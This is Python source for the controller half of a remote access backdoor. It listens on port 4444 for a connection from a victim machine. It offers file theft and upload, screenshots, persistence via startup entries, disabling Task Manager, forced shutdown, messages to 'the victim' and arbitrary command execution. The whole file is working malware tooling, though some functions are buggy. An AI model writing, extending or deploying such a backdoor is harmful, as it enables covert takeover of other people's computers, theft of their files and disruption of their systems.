import os
import json
import socket
import base64
import filemanager as fm
from datetime import datetime

class server_backdoor:
    file_manager = fm.file_manager()

    def __init__(self, ip, port):
        try:
            listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            listener.bind((ip, port))
            listener.listen(0)

            print("[+] Waiting for connections.")
            self.connection, address = listener.accept()
            print("[+] Got a connection from {}".format(address))
        except socket.error() as e:
            print("Error connecting: {}".format(e))

    def reliable_send(self, data):
        try:
            json_data = json.dumps(data)
            self.connection.send(json_data.encode())
        except Exception as e:
            return "[-] (Server) Couldn't send the data: {}".format(e)

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
            except Exception as e:
                return "[-] (Server) Couldn't receive the data: {}".format(e)

    def execute_remotely(self, command):
        try:
            self.reliable_send(command)    
            if command[0] == "exit" or command[0] == "e" or self.is_a_shutdown_type(command):
                self.connection.close()
                exit()
    
            return self.reliable_receive()
        except Exception as e:
            return "[-] (Server) Couldn't send/receive the data: {}".format(e)

    def is_a_shutdown_type(self, command):
        return ((command[0] == "cs" or command[0] == "changestate") and command[1] == "2") or ((command[0] == "cs" or command[0] == "changestate") and command[1] == "3")

    def write_file(self, content):
        try:
            path = os.path.abspath(os.getcwd())
            with open(path + "\\", "wb") as file:
                file.write(base64.b64decode(content))
                return "[+] Download successful."            
        except Exception as e:
            return "[-] (Server) Couldn't write to: {}, {}".format(path, e)

    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read()).decode()
        except Exception as e:
            return "[-] (Server) Couldn't extract data from: {}, {}".format(path, e)

    def take_screenshot(self, data):
        try:            
            time = datetime.now()
            file_name = "{}-{}-{}-{}-{}.png".format(time.day, time.month, time.hour, time.minute, time.second)
            
            self.write_file(file_name, data)            
            return "[+] Successfully managed to downlaod and save the screenshot."
        except Exception as e:
            return "[-] Error during download of the screenshot: {}".format(e)

    def help_menu(self):
        print("\nSystem Commands:")
        print("D path: Download a file.")
        print("U path: Upload a file.")
        print("SM: Send a Message to the victim.")
        print("EXC path: launch a file.")
        print("DEL path: Delete the File/Folder specified.")
        print("R path: Returns the content of the path.")
        print("PS path: Play a Sound && Q: Stop the Sound.")
        print("CS/changestate (1): Lock the System.")
        print("CS/changestate (2): Restart the System")
        print("CS/changestate (3): Shutdown the System.")
        print("\nOther Commands:")
        print("S: Take a Screenshot.")
        print("ST: Add to Startup.")
        print("RST: Remove from Startup.")
        print("TM: Enable/Disable Task Manager.")
        print("SI: Get Information about the User.")
        print("You can execute any cmd command.")
        
        print("\nH/help: Help menu")
        print("E/exit: Exit the program.")

    def run(self):
        self.help_menu()
        while True:
            command = input(">> ")
            command = command.split(" ")
            command_0 = command[0].lower()

            try:
                rest_of_sentence = " ".join(command[1:])
                if command_0 == "h" or command_0 == "help":
                    self.help_menu()
                    continue
                elif command_0 == "u":                    
                    file_content = self.read_file(rest_of_sentence)
                    command.append(file_content)
                
                result = self.execute_remotely(command)
                if command_0 == "d" and "[-]" not in result and rest_of_sentence != "":
                    result = self.write_file(result)
                elif command_0 == "s" and "[-]" not in result:                    
                    result = self.take_screenshot(result)        
            except Exception as e:
                result = "\n[-] Error during command execution: {}".format(e)
 
            print(result)

server = server_backdoor("192.168.1.107", 4444)
server.run()